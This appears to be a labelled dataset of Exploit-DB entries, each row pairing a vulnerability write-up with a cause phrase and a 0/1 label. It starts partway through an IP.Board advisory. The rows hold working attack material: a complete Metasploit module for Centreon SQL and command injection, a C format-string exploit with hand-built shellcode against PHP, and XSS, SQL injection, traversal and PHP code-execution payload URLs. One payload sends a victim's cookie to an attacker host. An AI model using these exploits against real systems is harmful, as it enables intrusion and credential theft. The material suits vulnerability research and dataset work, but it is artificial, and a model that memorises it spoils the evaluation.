boolean 	 * @since	2.0 	 */ 	static public function checkEmailAddress( $email = """" ) 	{   if (strlen($email) > 150) return FALSE; 		email = trim($email); 		$email = str_replace( "" "", """", $email );   		//----------------------------------------- 		// Check for more than 1 @ symbol 		//-----------------------------------------  		if ( substr_count( $email, '@' ) > 1 ) 		{ 			return FALSE; 		}   	if ( preg_match( '#[\;\#\n\r\*\'\""<>&\%\!\(\)\{\}\[\]\?\\/\s\,]#', $email ) ) 		{ 			return FALSE; 		} 		/* tld increased to 32 characters as per RFC - http://community.invisionpower.com/resources/bugs.html/_/ip-board/ipstextcheckemailaddress-does-not-match-new-2013-tlds-r41518*/ 		else if ( preg_match( '/^.+\@(\[?)[a-zA-Z0-9\-\.]+\.([a-zA-Z]{2,32}|[0-9]{1,4})(\]?)$/', $email) )  	{  		return TRUE;  	}  	else  	{  		return FALSE;  	} 	} ************************* END OF CODE ***************************  Enforces the e-mail variable to be shorter than 150 characters.  admin/source/base/ipsMember.php should be:  ************************ BEGIN OF CODE ************************ if ( strstr( $member_key, '@' ) ) { 	$member_value = ""'"" . ipsRegistry::DB()->addSlashes( strtolower( substr($member_key,0,140) ) ) . ""'""; 	$member_field = 'email'; }  [...]  if ( is_array( $member_key ) ) { 	array_walk( $member_key, create_function( '&$v,$k', '$v=""\'"".ipsRegistry::DB()->addSlashes( strtolower( substr($v,0,140) ) ) . ""\'"";' ) ); 	$multiple_ids = $member_key; } else { 	$member_value = ""'"" . ipsRegistry::DB()->addSlashes( strtolower( substr($member_key,0,140) ) ) . ""'""; } $member_field = 'email'; ************************* END OF CODE ***************************  This will truncate the string to 140 characters.   Patching 1st or 2nd file fixes the bug.   	B) Common sense  		- Never use a known email-adress for your application deployment, monitoring, supervision, ... You may use catch-all, or even better, another domain.tld than your own. 		- Never deploy applications you do not completely trust (no one ?) or you did not code review on shared hosting with other projects or applications that are not on that same network. Especially forums that expose a wide attack surface to malicious users. 		- Use mitigation systems such as IDS (which can be evaded depending on your attacker skills). 		- Blacklist dangerous php functions (using http://www.hardened-php.net/suhosin/configuration.html#suhosin.executor.func.blacklist ?) 			php_admin_value open_basedir /home/ipb/:/usr/share/php/ 			php_admin_value suhosin.executor.func.blacklist exec,dl,fpassthru,move_uploaded_file,phpinfo,passthru,shell_exec,system,proc_open,popen,curl,curl_exec,curl_multi_exec,parse_ini_file,show_source, ... 		- Use a chrooted environment 		- ...  [III] Recommendations  The vendor has released a patch which fixes these vulnerabilities. It is strongly recommended to upgrade your software version: http://community.invisionpower.com/topic/385207-ipboard-32x-33x-and-34x-critical-security-update/  [IV] Timeline  2013/05/02: Advisory sent to IPB 2013/05/02: IPB responded 2013/05/03: Patch has been released 2013/05/03: IPB asked to wait at least a week before publishing advisory to protect their huge community 2013/05/13: Advisory is released  [V] Author  John JEAN is a French security researcher working at Wargan Solutions - http://www.wargan.com Follow him on twitter @johnjean  [VI] PGP  -----BEGIN PGP PUBLIC KEY BLOCK----- Version: GnuPG v1.4.9 (GNU/Linux)  mQGiBEo1REYRBADDGgkQVv+iN+LzRFH3WiDX+S0iTPg60MzTifYpfbeKH+FwdN/J /lujfR3TjielPEWVbYCnPJA/wHNNUACm6+qWoPx5SzjKq1BXMoGoUkO5DtXivboG NugVyKOBh7OARWilOkP6eB2zqbf/2ReHQtbX8a7xWyHzApyIAo/F2CiYOwCg7SyD UQifs08r8Um3pmyLMxTVjncD/1BrpfSWgYJYFLPobHuRvtoEyhK9ONuNWgQKYHQm mpoM6nxNVijySPpgyuyeDcyxgOzLJ3QI9Mqx+tmr1uLFZhAWSe0K5uz64pQ9PUMF LTvN5uN3sVAER4kA1Jxs5foTIkrCA6eQqmypIfo/egX1W1Y/1uC0aB0/kG11rQO0 fgUwA/4qubdS0PcnPZUQYVJUe6rDx5r2U/WVD+sHFY+ILFnVzdrxEdr1md35e9P5 ovuMfUunIwKH8BjSG3fXXESTZuZXfFlqwrR+m1y5qUcXwr9wnffRP2iQxIaQi5+b D4dR1J+oiNlPlVL8FuKK1dKHjIN9u4tjlE/VWCxoUyo97320z7QtSm9obiBKRUFO IChHZWVrIFdvcmthaG9saWMpIDxKb2huQHdhcmdhbi5jb20+iGAEExECACAFAko1 REYCGwMGCwkIBwMCBBUCCAMEFgIDAQIeAQIXgAAKCRBthXHBmOb+lvYJAJ9k30a7 lZx92PXQfNeoKocX5Uo3vACgtWuhqkDB1IvRMjMe49ng18Sp87y5Ag0ESjVERhAI AM0fzE0z5enz37lGPPHZrgW+XYWHNLfoR0gJvpu0FkPj4udPYL6+RJLGocWeJQBb UuEgcFdKJugxs3U9y/5iSFfM3e5+jOqPZCj6loP8nY9yarfVQHlZKqn6zseCT3D8 d1uTNJWnzb5LYnbFrETCyJbaENH8jzNQCGP3NCyIfXfn5Wag7HUh6Zi6njwl/2zx saizuQ3Wv0PjiVuJ8QEPvOdN9crTwt/JB2xRd98st7S5oEHvP96MyOtWSUWEnLSG fQhVyZC+aLLCOp8ggNkCAwOUGvPetJXVOLaPUJAoEwzDxXl43+GlKreqXH+W2GZT 0/n8W4p28Xrqv2G/SJa9sg8AAwUH/0GvW9eYRLaRDuAaBdlGX8jXsCnOvdMoioeg Wq9HwIYr94/kW2wJ1QFnhuEU/0cwx9MVrMElW0Q14kyY3KVUWAVpUTbfUPmtD6lo RO3EnoHDJoaak0yuw67Townpc9zRIBci3vUcUTh9SwUtv16b96DI92BRRu8XBaRU 13E33BWUkf6DebpYHmCmlwy3NelHfOtbzc2FBJ7Xt+hQnxd+07V2NgUNjMpCQrMD oh8ulOLWvrGKm7SZhV0ubqTt85mM6j5tmw0dkMwsGhgnf0U12uMfEKxm3IjcU+uk 0757WvPQQcr/iFSjxXwroqIgZpSJ/L1c8cfXgZ5bf0syeFODxEGISQQYEQIACQUC SjVERgIbDAAKCRBthXHBmOb+loxrAKDUB6CWC+kYIOaRmD9IvVfKosm9wgCeN4XV 3vIlH84xsRZ/rS/yfwggdDc= =jCPh -----END PGP PUBLIC KEY BLOCK-----",Incorrect e-mail address validation code,1
41676,"Centreon < 2.5.1 / Centreon Enterprise Server < 2.2 - SQL Injection / Command Injection (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'           => 'Centreon SQL and Command Injection',       'Description'    => %q{         This module exploits several vulnerabilities on Centreon 2.5.1 and prior and Centreon         Enterprise Server 2.2 and prior. Due to a combination of SQL injection and command         injection in the displayServiceStatus.php component, it is possible to execute arbitrary         commands as long as there is a valid session registered in the centreon.session table.         In order to have a valid session, all it takes is a successful login from anybody.         The exploit itself does not require any authentication.         This module has been tested successfully on Centreon Enterprise Server 2.2.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'MaZ', # Vulnerability Discovery and Analysis           'juan vazquez' # Metasploit Module         ],       'References'     =>         [           ['CVE', '2014-3828'],           ['CVE', '2014-3829'],           ['US-CERT-VU', '298796'],           ['URL', 'http://seclists.org/fulldisclosure/2014/Oct/78']         ],       'Arch'           => ARCH_CMD,       'Platform'       => 'unix',       'Payload'        =>         {           'Space'       => 1500, # having into account 8192 as max URI length           'DisableNops' => true,           'Compat'      =>             {               'PayloadType' => 'cmd cmd_bash',               'RequiredCmd' => 'generic python gawk bash-tcp netcat ruby openssl'             }         },       'Targets'        =>         [           ['Centreon Enterprise Server 2.2', {}]         ],       'Privileged'     => false,       'DisclosureDate' => 'Oct 15 2014',       'DefaultTarget'  => 0))      register_options(       [         OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/centreon'])       ], self.class)   end    def check     random_id = rand_text_numeric(5 + rand(8))     res = send_session_id(random_id)      unless res && res.code == 200 && res.headers['Content-Type'] && res.headers['Content-Type'] == 'image/gif'       return Exploit::CheckCode::Safe     end      injection = ""#{random_id}' or 'a'='a""     res = send_session_id(injection)      if res && res.code == 200       if res.body && res.body.to_s =~ /sh: graph: command not found/         return Exploit::CheckCode::Vulnerable       elsif res.headers['Content-Type'] && res.headers['Content-Type'] == 'image/gif'         return Exploit::CheckCode::Detected       end     end      Exploit::CheckCode::Safe   end    def exploit     if check == Exploit::CheckCode::Safe       fail_with(Failure::NotVulnerable, ""#{peer} - The SQLi cannot be exploited"")     elsif check == Exploit::CheckCode::Detected       fail_with(Failure::Unknown, ""#{peer} - The SQLi cannot be exploited. Possibly because there's nothing in the centreon.session table. Perhaps try again later?"")     end      print_status(""Exploiting..."")     random_id = rand_text_numeric(5 + rand(8))     random_char = rand_text_alphanumeric(1)     session_injection = ""#{random_id}' or '#{random_char}'='#{random_char}""     template_injection = ""' UNION ALL SELECT 1,2,3,4,5,CHAR(59,#{mysql_payload}59),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- /**""     res = send_template_id(session_injection, template_injection)      if res && res.body && res.body.to_s =~ /sh: --imgformat: command not found/       vprint_status(""Output: #{res.body}"")     end   end    def send_session_id(session_id)     res = send_request_cgi(       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.to_s, 'include', 'views', 'graphs', 'graphStatus', 'displayServiceStatus.php'),       'vars_get' =>         {           'session_id' => session_id         }     )      res   end    def send_template_id(session_id, template_id)     res = send_request_cgi({       'method'   => 'GET',       'uri'      => normalize_uri(target_uri.to_s, 'include', 'views', 'graphs', 'graphStatus', 'displayServiceStatus.php'),       'vars_get' =>         {           'session_id' => session_id,           'template_id' => template_id         }       }, 3)      res   end    def mysql_payload     p = ''     payload.encoded.each_byte { |c| p << ""#{c},""}     p   end  end","a combination of SQL injection and command injection in the displayServiceStatus.php component,",0
38410,"WordPress Plugin Banners Lite - 'wpbanners_show.php' HTML Injection source: https://www.securityfocus.com/bid/58671/info  The Banners Lite plugin for WordPress is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.  Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.   http://www.example.com/wordpress/wp-content/plugins/wp-banners-lite/wpbanners_show.php?id=1&cid=a_<script>alert(/XSSProof-of-Concept/)</script>",fails to properly sanitize user-supplied input,1
27900,"Artmedic NewsLetter 4.1 - 'Log.php' Remote Script Execution source: https://www.securityfocus.com/bid/18047/info  Artmedic Newsletter is prone to a remote PHP code-execution vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to create files containing arbitrary content that can include arbitrary malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible. Attackers may also remove arbitrary log files, assisting them in obscuring their actions.  Version 4.1 of the software is vulnerable to this issue; other versions may also be affected.  http://www.example.com/log.php?logfile=info.php&logtime=000060&email=<?%20require($cur);%20echo%20$password%20?> http://www.example.com/log.php?logfile=info.php&logtime=000000",a failure in the application to properly sanitize user-supplied input,1
32243,"Nukeviet 2.0 - '/admin/login.php' Cookie Authentication Bypass source: https://www.securityfocus.com/bid/30681/info  Nukeviet is prone to an authentication-bypass vulnerability because it fails to adequately verify user-supplied input used for cookie-based authentication.  Attackers can exploit this vulnerability to gain administrative access to the affected application.  Nukeviet 2.0 Beta is vulnerable; other versions may also be affected.   javascript:document.cookie = ""admf=1; path=/"";",fails to adequately verify user-supplied input used for cookie-based authentication,1
40230,"SAP SAPCAR - Multiple Vulnerabilities 1. Advisory Information  Title: SAP CAR Multiple Vulnerabilities Advisory ID: CORE-2016-0006 Advisory URL: http://www.coresecurity.com/advisories/sap-car-multiple-vulnerabilities Date published: 2016-08-09 Date of last update: 2016-08-09 Vendors contacted: SAP Release mode: Coordinated release  2. Vulnerability Information  Class: Unchecked Return Value [CWE-252], TOCTOU Race Condition [CWE-367] Impact: Denial of service, Security bypass Remotely Exploitable: No Locally Exploitable: Yes CVE Name: CVE-2016-5845, CVE-2016-5847  3. Vulnerability Description  SAP [1] distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to local denial of service conditions or privilege escalation.  4. Vulnerable Packages  SAPCAR archive tool Other products and versions might be affected, but they were not tested.  5. Vendor Information, Solutions and Workarounds  SAP published the following Security Notes:  2312905 2327384  6. Credits  This vulnerability was discovered and researched by Martin Gallo from Core Security Consulting Services. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.  7. Technical Description / Proof of Concept Code  SAP distributes software and packages using an archive program called SAPCAR. This program uses a custom archive file format. Vulnerabilities were found in the extraction of specially crafted archive files, that could lead to denial of service conditions or escalation of privileges.  The code that handles the extraction of archive files is prone to privilege escalation and denial of service vulnerabilities.  7.1. Denial of service via invalid file names  [CVE-2016-5845] Denial of service vulnerability due the SAPCAR program not checking the return value of file operations when extracting files. This might result in the program crashing when trying to extract files from an specially crafted archive file that contains invalid file names for the target platform. Of special interest are applications or solutions that makes use of SAPCAR in an automated way.  The following is a proof of concept to demonstrate the vulnerability:            $ xxd SAPCAR_crash.SAR          0000000: 4341 5220 322e 3031 4452 0081 0000 0f00  CAR 2.01DR......         0000010: 0000 0000 0000 0000 0000 d4f8 e555 0000  .............U..         0000020: 0000 0000 0000 0000 1000 696e 7075 742d  ..........input-         0000030: 6469 722f 696e 7090 7400 4544 1a00 0000  dir/inp.t.ED....         0000040: 0f00 0000 121f 9d02 7bc1 23b9 a90a 25a9  ........{.#...%.         0000050: 1525 0a69 9939 a95c 0000 857f b95a       .%.i.9.\.....Z                  $ ./SAPCAR -dvf SAPCAR_crash.SAR         SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)         d input-dir/inp#t         SAPCAR: checksum error in input-dir/inp#t (error 12). No such file or director                  $ ./SAPCAR -xvf SAPCAR_crash.SAR         SAPCAR: processing archive SAPCAR_crash.SAR (version 2.01)         x input-dir/inp#t         Segmentation fault   7.2. Race condition on permission change  [CVE-2016-5847] Race condition vulnerability due to the way the SAPCAR program change the permissions of extracted files. If a malicious local user has access to a directory where a user is extracting files using SAPCAR, the attacker might use this vulnerability to change the permissions of arbitrary files belonging to the user.  The SAPCAR program writes the file being extracted and after closing it, the program changes the permissions to the ones set on the archive file. There's a time gap between the creating of the file and the change of the permissions. During this time frame, a malicious local user can replace the extracted file with a hard link to a file belonging to another user, resulting in the SAPCAR program changing the permissions on the hard-linked file to be the same as that of the compressed file.  The following is a proof of concept to demonstrate the vulnerability:          $ xxd SAPCAR_race_condition.SAR       0000000: 4341 5220 322e 3031 5247 b481 0000 2b00  CAR 2.01RG....+.       0000010: 0000 0000 0000 0000 0000 d023 5e56 0000  ...........#^V..       0000020: 0000 0000 0000 0000 1000 7465 7374 5f73  ..........test_s       0000030: 7472 696e 672e 7478 7400 4544 3500 0000  tring.txt.ED5...       0000040: 2b00 0000 121f 9d02 7b21 19a9 0a85 a599  +.......{!......       0000050: c9d9 0a49 45f9 e579 0a69 f915 0a59 a5b9  ...IE..y.i...Y..       0000060: 05c5 0af9 65a9 450a 2540 e99c c4aa 4a85  ....e.E.%@....J.       0000070: 94fc 7400 0008 08c6 b9                   ..t......              $ ./SAPCAR -tvf SAPCAR_race_condition.SAR        SAPCAR: processing archive SAPCAR_race_condition.SAR (version 2.01)       -rw-rw-r--          43    01 Dec 2015 19:48 test_string.txt              $ strace ./SAPCAR -xvf SAPCAR_race_condition.SAR        execve(""./SAPCAR"", [""./SAPCAR"", ""-xvf"", ""SAPCAR_race_condition.SAR""], [/* 76 vars */]) = 0       [..]       open(""test_string.txt"", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4       mmap(NULL, 323584, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c4704000       fstat(4, {st_mode=S_IFREG|0664, st_size=0, ...}) = 0       mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f98c475c000       write(4, ""The quick brown fox jumps over t""..., 43) = 43       close(4)                                = 0       munmap(0x7f98c475c000, 4096)            = 0       utime(""test_string.txt"", [2015/12/01-19:48:48, 2015/12/01-19:48:48]) = 0       chmod(""test_string.txt"", 0664)          = 0       [..]         8. Report Timeline  2016-04-21: Core Security sent an initial notification to SAP. 2016-04-22: SAP confirmed the reception of the email and requested the draft version of the advisory. 2016-04-22: Core Security sent SAP a draft version of the advisory and informed them we would adjust our publication schedule according with the release of a solution to the issues. 2016-04-25: SAP confirmed the reported vulnerabilities and assigned the following security incident tickets IDs: 1670264798, 1670264799 and 1670264800. 2016-05-10: Core Security asked SAP if they had a tentative date for publishing the security fixes. 2016-05-20: SAP informed Core Security they have a tentative release date on July 12th, 2016 (July Patch day). 2016-05-23: Core Security thanked SAP for the tentative date and informed them we would publish our security advisory accordingly upon their confirmation. 2016-06-27: Core Security requested SAP the tentative security notes numbers and links in order to add them to our security advisory. 2016-07-05: SAP informed Core Security they due to some issues found during their testing phase of the patches they were not in a position to ship the patches as part of their July patch day. They said they would be able to ship the patches with August patch day. 2016-07-06: Core Security requested SAP the specific day in August they planed to release the patches. 2016-07-20: Core Security requested again SAP the specific day in August they planed to release the patches. 2016-07-21: SAP informed Core Security they would publish their security notes on the 9th of August. 2016-08-10: Advisory CORE-2016-0006 published. 9. References  [1] http://go.sap.com/.   10. About CoreLabs  CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.  11. About Core Security  Courion and Core Security have rebranded the combined company, changing its name to Core Security, to reflect the company’s strong commitment to providing enterprises with market-leading, threat-aware, identity, access and vulnerability management solutions that enable actionable intelligence and context needed to manage security risks across the enterprise. Core Security’s analytics-driven approach to security enables customers to manage access and identify vulnerabilities, in order to minimize risks and maintain continuous compliance. Solutions include Multi-Factor Authentication, Provisioning, Identity Governance and Administration (IGA), Identity and Access Intelligence (IAI), and Vulnerability Management (VM). The combination of these solutions provides context and shared intelligence through analytics, giving customers a more comprehensive view of their security posture so they can make more informed, prioritized, and better security remediation decisions.  Core Security is headquartered in the USA with offices and operations in South America, Europe, Middle East and Asia. To learn more, contact Core Security at (678) 304-4500 or info@coresecurity.com.  12. Disclaimer  The contents of this advisory are copyright (c) 2016 Core Security and (c) 2016 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/  13. PGP/GPG Keys  This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.",the SAPCAR program not checking the return value of file operations when extracting files.,1
32424,OpenNMS 1.5.x - 'Username' Cross-Site Scripting source: https://www.securityfocus.com/bid/31410/info   OpenNMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   Versions prior to OpenNMS 1.5.94 are vulnerable.   http://www.example.com/opennms/notification/list.jsp?username=%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E,fails to properly sanitize user-supplied input,1
28119,"vCard PRO - 'gbrowse.php?cat_id' SQL Injection source: https://www.securityfocus.com/bid/18699/info  VCard PRO is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  http://www.example.com/gbrowse.php?cat_id=[SQL]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
20280,"Bytes interactive Web shopper 1.0/2.0 - Directory Traversal source: https://www.securityfocus.com/bid/1776/info  Bytes Interactive Web Shopper is a XML based shopping cart application.   The ""newpage"" variable does not properly check for insecure relative paths such as the double dot "".."".   The following URL request:  http://target/cgi-bin/shopper.cgi?newpage=../../../path/filename.ext  will yield the file specified.  Successful exploitation could lead to a remote intruder gaining read access to any known file.","The ""newpage"" variable does not properly check for insecure relative paths such as the double dot ""..""",1
24254,"BasiliX Webmail 1.1 - Email Header HTML Injection source: https://www.securityfocus.com/bid/10662/info  BasiliX Webmail is reported to be prone to an email header HTML injection vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied email header strings.  An attacker can exploit this issue to gain access to an unsuspecting user's cookie based authentication credentials; disclosure of personal email is possible. Other attacks are also possible.  Content-Type: application/octet-stream""<script>window.alert(document.cookie)</script>""; name=top_secret.pdf",a failure of the application to properly sanitize user-supplied email header strings,1
26108,Dvbbs 7.1/8.2 - 'dispuser.asp?name' Cross-Site Scripting source: https://www.securityfocus.com/bid/14498/info   DVBBS is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/dispuser.asp?name=Walltrapass[XSS-CODE],the application fails to properly sanitize user-supplied input,1
20286,"PHP 3.0/4.0 - Error Logging Format String // source: https://www.securityfocus.com/bid/1786/info  PHP is a scripting language designed for CGI applications that is used on many websites. There exists a remotely exploitable format string vulnerability in all versions of PHP below PHP 4.0.3.   The vulnerability exists in the code that handles error logging and is present if error logging is enabled in the ""php.ini"" configuration file. When errors are encountered by PHP, a string containing data supplied by the user is passed as the format string argument (the log_message variable) to the php_syslog() function (which contains *printf functions). As a result, it is possible for a malicious user to craft a string containing malicious format specifiers that will be passed to the php_syslog function as part of an error message. When interpreted by the *printf functions, these specifiers can cause the process to overwrite its own stack variables with arbitrary data. This can lead to remote access being gained on the target host with privileges of the webserver for the attacker.  Error logging may or may not be enabled by default on systems shipped with PHP.   #include<stdio.h> #include<sys/types.h> #include<sys/socket.h> #include<netinet/in.h> #include<arpa/inet.h> #include<netdb.h>  #define BSIZE 1549 #define BUFFERZONE 128  int main(int argc, char *argv[]) {   int i,start,count;   int stackloc=0xBFFFDA60;   int s;   FILE *f;   fd_set rfds;   struct hostent *he;   struct sockaddr_in saddr;   char sploit[BSIZE];   char file[]=""/tmp/BADPHP"";   char c;    if(argc!=5) {     printf(""%s <addr> <port> <offset> <php file name>\n"",argv[0]);     printf(""offset=0 for most systems.\n"");      return 0;   }    /*** build exploit string ***/      /* write bad format string, adding in offset */   snprintf(sploit,sizeof(sploit), 	   ""Content-Type:multipart/form-data %%%uX%%X%%X%%hn"", 	   55817 /*+offset0,1,2,3*/ );    /* fill with breakpoints and nops*/   start=strlen(sploit);   memset(sploit+start,0xCC,BSIZE-start);   memset(sploit+start+BUFFERZONE*4,0x90,BUFFERZONE*4);   sploit[BSIZE-1]=0;      /* pointer to start of code (stackloc+4) */   count=BUFFERZONE;   for(i=0;i<count;i++) {     unsigned int value=stackloc+4+(count*4);     if((value&0x000000FF)==0) value|=0x00000004;     if((value&0x0000FF00)==0) value|=0x00000400;     if((value&0x00FF0000)==0) value|=0x00040000;     if((value&0xFF000000)==0) value|=0x04000000;     *(unsigned int *)&(sploit[start+i*4])=value;   }   start+=BUFFERZONE*4*2;    /*** build shellcode ***/    sploit[start+0]=0x90; /* nop */      sploit[start+1]=0xBA; /* mov edx, (not 0x1B6 (a+rw)) */   sploit[start+2]=0x49;   sploit[start+3]=0xFE;   sploit[start+4]=0xFF;   sploit[start+5]=0xFF;    sploit[start+6]=0xF7; /* not edx */   sploit[start+7]=0xD2;    sploit[start+8]=0xB9; /* mov ecx, (not 0x40 (O_CREAT)) */   sploit[start+9]=0xBF;   sploit[start+10]=0xFF;   sploit[start+11]=0xFF;   sploit[start+12]=0xFF;      sploit[start+13]=0xF7; /* not ecx */   sploit[start+14]=0xD1;      sploit[start+15]=0xE8; /* call eip+4 + inc eax (overlapping) */   sploit[start+16]=0xFF;    sploit[start+17]=0xFF;    sploit[start+18]=0xFF;    sploit[start+19]=0xFF;    sploit[start+20]=0xC0;   sploit[start+21]=0x5B; /* pop ebx */   sploit[start+22]=0x6A; /* push 22 (offset to end of sploit (filename)) */   sploit[start+23]=0x16;   sploit[start+24]=0x58; /* pop eax */   sploit[start+25]=0x03; /* add ebx,eax */   sploit[start+26]=0xD8;      sploit[start+27]=0x33; /* xor eax,eax */   sploit[start+28]=0xC0;    sploit[start+29]=0x88; /* mov byte ptr [ebx+11],al */   sploit[start+30]=0x43;   sploit[start+31]=0x0B;     sploit[start+32]=0x83; /* add eax,5 */   sploit[start+33]=0xC0;   sploit[start+34]=0x05;    sploit[start+35]=0xCD; /* int 80 (open) */   sploit[start+36]=0x80;    sploit[start+37]=0x33; /* xor eax,eax */   sploit[start+38]=0xC0;     sploit[start+39]=0x40; /* inc eax */      sploit[start+40]=0xCD; /* int 80 (_exit) */   sploit[start+41]=0x80;      /* add filename to touch */   strncpy(&sploit[start+42],file,strlen(file));    /*** send exploit string ***/     /* create socket */   s=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);   if(s<0) {     printf(""couldn't create socket.\n"");     return 0;   }      /* connect to port */   memset(&saddr,0,sizeof(saddr));   saddr.sin_family=AF_INET;   saddr.sin_port=htons(atoi(argv[2]));   he=gethostbyname(argv[1]);   if(he==NULL) {     printf(""invalid hostname.\n"");   }   memcpy(&(saddr.sin_addr.s_addr),he->h_addr_list[0],sizeof(struct in_addr));    if(connect(s,(struct sockaddr *)&saddr,sizeof(saddr))!=0) {     printf(""couldn't connect.\n"");     return 0;   }      /* fdopen the socket to use stream functions */   f=fdopen(s,""w"");   if(f==NULL) {     close(s);     printf(""couldn't fdopen socket.\n"");     return 0;   }    /* put the post request to the socket */   fprintf(f,""POST %s HTTP/1.0\n"",argv[4]);   fputs(sploit,f);   fputc('\n',f);   fputc('\n',f);   fflush(f);    /* close the socket */   fclose(f);   close(s);    return 0; }","error logging and is present if error logging is enabled in the ""php.ini"" configuration file",1
31702,"PHP-Nuke DownloadsPlus Module - Arbitrary File Upload source: https://www.securityfocus.com/bid/28919/info  The DownloadsPlus module for PHP-Nuke is prone to a vulnerability that lets remote attackers upload and execute arbitrary code because the application fails to sanitize user-supplied input. This issue permits attackers to upload arbitrary files with '.htm', '.html', or '.txt' extensions.  An attacker can leverage this issue to execute arbitrary code on an affected computer with the privileges of the webserver process.  Note that to exploit this issue, the attacker may require valid login credentials.   http://www.example.com/phpnuke/upload_category/filename.html",the application fails to sanitize user-supplied input,1
24766,"Nuked-klaN 1.x - Submit Link Function HTML Injection source: https://www.securityfocus.com/bid/11733/info  NuKed-Klan 'submit URI link' function is reported prone to a HTML injection vulnerability. It is reported that the issue exists due to a lack of sufficient input validation performed on the 'website name' input field of the NuKed-Klan submit URI link form.  Attackers may potentially exploit this issue to manipulate web content or to steal cookie-based authentication credentials. It may also be possible to take arbitrary actions as the victim user.  http://www.example.com/index.php?file=Suggest&module=Links [Name of website] [a lot of spaces] \'/>\""/><script></script><script>document.location=\'http://www.hacker.com/cookie.php?cookie=\' +window.document.cookie;</script>",a lack of sufficient input validation performed on the 'website name' input field of the NuKed-Klan submit URI link form,1
37134,"MySQLDumper 1.24.4 - 'menu.php' PHP Remote Code Execution source: https://www.securityfocus.com/bid/53310/info  MySQLDumper is prone to a vulnerability that lets remote attackers execute arbitrary code because the application fails to sanitize user-supplied input.  Attackers can exploit this issue to execute arbitrary PHP code within the context of the affected webserver process.  MySQLDumper 1.24.4 is vulnerable; other versions may also be affected.   Vulnerable code section: /* //menu.php if (isset($_POST['selected_config'])||isset($_GET['config'])) { if (isset($_POST['selected_config'])) $new_config=$_POST['selected_config']; // Configuration was switched in content frame? if (isset($_GET['config'])) $new_config=$_GET['config']; // restore the last active menuitem if (is_readable($config['paths']['config'].$new_config.'.php')) { clearstatcache(); unset($databases); $databases=array(); if (read_config($new_config)) { $config['config_file']=$new_config; $_SESSION['config_file']=$new_config; //$config['config_file']; $config_refresh=' <script language=""JavaScript"" type=""text/javascript""> if (parent.MySQL_Dumper_content.location.href.indexOf(""config_overview.php"")!=-1) { var selected_div=parent.MySQL_Dumper_content.document.getElementById(""sel"").value; } else selected_div=\'\'; parent.MySQL_Dumper_content.location.href=\'config_overview.php?config='.urlencode($new_config).'&sel=\'+selected_div</script>'; } if (isset($_GET['config'])) $config_refresh=''; //Neu-Aufruf bei Uebergabe aus Content-Bereich verhindern } }    */ As you can see we can traverse it +  if we will look to read_config() function //inc/functions_global.php  function read_config($file=false) { global $config,$databases; $ret=false; if (!$file) $file=$config['config_file']; // protect from including external files $search=array(':', 'http', 'ftp', ' '); $replace=array('', '', '', ''); $file=str_replace($search,$replace,$file);  if (is_readable($config['paths']['config'].$file.'.php')) { // to prevent modern server from caching the new configuration we need to evaluate it this way clearstatcache(); $f=implode('',file($config['paths']['config'].$file.'.php')); $f=str_replace('<?php','',$f); $f=str_replace('?>','',$f); eval($f); $config['config_file']=$file; $_SESSION['config_file']=$config['config_file']; $ret=true; } return $ret; }  this means remote attacker can iterate his/her code as PHP.(Notice: eval($f))  Our exploit: http://www.example.com/learn/cubemail/menu.php?config=../../ss where ss = ss.php #cat ss.php # in eg attacker uploaded his/her own file: echo 'Our command executed ' . getcwd(); phpinfo();",the application fails to sanitize user-supplied input,1
